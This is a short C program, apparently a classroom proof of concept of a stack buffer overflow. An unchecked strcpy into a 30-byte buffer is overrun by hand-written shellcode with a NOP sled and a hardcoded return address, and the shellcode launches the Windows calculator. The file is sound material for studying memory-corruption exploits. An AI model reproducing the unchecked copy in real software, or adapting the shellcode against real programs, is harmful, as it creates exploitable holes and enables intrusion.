#include <string.h> 
void vuln(char* str) 
{ 
char buf[30]; 
strcpy(buf, str); 
} 

int main() 
{ 
char shellcode[]= 
"\x8b\xec\x68""    " 
"\x68""calc" 
"\x8d\x45\xf8\x50\xb8\x4D" 
"\x11\x86\x7C\xff\xd0" 
"\x90\x90\x90\x90\x90" 
"\x90\x90\x90\x90" 
"\x90\x90\x90\x90" 
"\xc4\xfe\x12\x00"; 
vuln(shellcode); 
return 0; 
}

///x7c /x94 /x1e /xed
